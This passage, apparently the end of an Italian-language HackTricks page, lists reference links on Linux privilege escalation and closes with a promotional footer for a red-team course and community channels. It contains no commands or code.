* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://
